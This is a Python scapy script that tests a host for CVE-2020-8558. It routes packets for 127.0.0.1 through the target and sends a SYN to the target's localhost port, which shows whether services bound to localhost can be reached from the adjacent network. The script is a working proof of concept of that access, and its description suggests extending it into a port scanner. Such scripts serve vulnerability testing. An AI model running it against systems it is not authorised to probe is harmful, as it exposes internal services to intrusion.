#! /usr/bin/env python3

import argparse
import sys

from scapy.all import *

parser = argparse.ArgumentParser(description="Test for CVE-2020-8558. Extension into a port scanner is left as an exercise for the reader.")
parser.add_argument("target", type=str , help="Vulnerable host on which to access localhost services.")
parser.add_argument("--port", type=int, help="Target port. Defaults to 8080.", default=8080 )
parser.add_argument("--timeout", type=float, help="Timeout in seconds to wait for response packets. Defaults to .1", default=0.1 )

args = parser.parse_args()

conf.route.add(host="127.0.0.1",gw=args.target,metric=0)

ret = sr1( IP(dst="127.0.0.1")/TCP(dport=args.port,flags="S"), retry=3, timeout=args.timeout, verbose=0 )

if ret is not None:
    if ret.haslayer(TCP):
        if ret[TCP].flags == "SA":
            print (args.target+" IS VULNERABLE. Port "+str(args.port)+" is open.")
            sys.exit(1)
        elif ret[TCP].flags == "RA":
            print (args.target+" IS VULNERABLE. Port "+str(args.port)+" is closed.")
            sys.exit(2)
        else:
            print (args.target+" responded unexpectedly, and may be vulnerable.")
            sys.exit(253)
    else: 
        print (args.target+" responded unexpectedly. Investigate further.")
        sys.exit(254)
else:
    print (args.target+" did not reply. It is likely not exploitable.")
    sys.exit(0)
